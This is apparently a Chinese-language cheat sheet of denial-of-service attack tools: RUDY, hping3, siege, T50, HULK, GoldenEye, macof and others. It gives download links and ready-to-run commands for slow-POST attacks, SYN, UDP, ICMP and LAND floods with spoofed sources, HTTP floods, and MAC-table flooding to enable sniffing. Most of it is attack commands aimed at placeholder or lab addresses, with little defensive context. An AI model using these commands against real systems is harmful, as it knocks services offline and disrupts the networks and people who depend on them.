# 拒绝服务攻击工具

## 0x01 RUDY
> 漫速应用层HTTP POST攻击,与slowhttptest原理相同,每次只传输—个字节的数据, 美剧“黑客军团”中也曾提到此攻击手段, 攻击有表单WEB页面,攻击时需指定攻击的参数名称

##### 下载地址: https://sourceforge.net/projects/r-u-dead-yet/files/latest/download

```
使用:
需要先设置攻击目标,及参数如
vim rudeadyet.conf 
    [parameters]

    URL: http://www.victim.com/dvwa
    number_of_connections: 500
    attack_parameter: username
    proxy_addr: ""
    proxy_port: 0

python r-u-dead-yet-v2.2.py
```

## 0x02 hping3
> 几乎可以定制发送任何TCP/IP数据包,用于测试FW、端口扫描、性能测试

##### Syn Flood攻击
- hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source 1.1.1.1
-	hping3 -S -P -U -p 80 --flood --rand-source 1.1.1.1

##### TCP Flood
-	hping3 -SARFUP -p 80 --flood --rand-source 1.1.1.1
- nping --tcp-connect --rate=10000 -c 1000000000 -q 1.1.1.1 #也可尝试nping工具

##### ICMP Flood攻击
- hping3 -q -n -a 1.1.1.1 --icmp -d 56 --flood 1.1.1.2

##### UDP Flood攻击
- hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood 1.1.1.2

##### LAND攻击
> 特殊类型的syn flood攻击, 特殊之处就在于源地址, 目标地址都是受害者, 受害者与自己完成三次握手
- hping3 -n -a 1.1.1.1 -S -d 100 -p 80 --flood 1.1.1.1


## 0x03 siege
> http/https 压力测试工具,模拟多个用户并发访问请求

```
siege -h

# get方式测试
siege -g http://1.1.1.1/a.php

或可以批量设置目标 vim /etc/siege/urls.txt
siege -i -c 1000 -v # 自动调用
```

## 0x04 T50
> 对网络的测试工具, 可以使用各种协议, 包括路由器等才有应用的协议

```
t50 -h
t50 1.1.1.1 --flood --turbo -S --protocol TCP --dport 80
t50 1.1.1.1 --flood --turbo -S TCP UDP OSPF EIGRP --dport 22
```

## 0x07 HULK
> HULK(Http Unbearable Load King), python 编写, 随机产生大量唯一的地址请求, 避免命中缓存, 而且带参数的传递, 也可以多消耗一些系统资源.

下载地址: https://packetstormsecurity.com/files/download/112856/hulk.zip

```
python hulk.py http://test.com/dvwa/
```

## 0x08 DDOSIM
> 比较古老了, 很多依赖的库系统已经升级, 不再可用.

-	7层拒绝服务工具（模拟多个僵尸机）
-	随机IP地址
-	基于TCP连接的攻击
-	应用层DDoS攻击
-	正常的HTTP请求、非正常的HTTP请求式DDoS
-	SMTP DDoS
-	随机端口的TCP连接洪水

## 0x09 GoldenEye
-	http/https拒绝服务攻击工具
-	安全研究为目的Python脚本
-	随机攻击向量,keep-alive,避免缓存命中

下载地址: https://github.com/jseidl/GoldenEye/archive/master.zip

```
python goldeneye.py http://192.168.0.130 -w 40
```

## 0x10 Macof
> 产生大量mac地址, 可能对路由器造成Dos攻击, 也可以造成路由的异常, 使路由器像hub一样广播数据帧. 之后可以抓包嗅探流量.

```
man macof
macof -i eth0 -s 192.168.0.130 -d 192.168.0.1
```
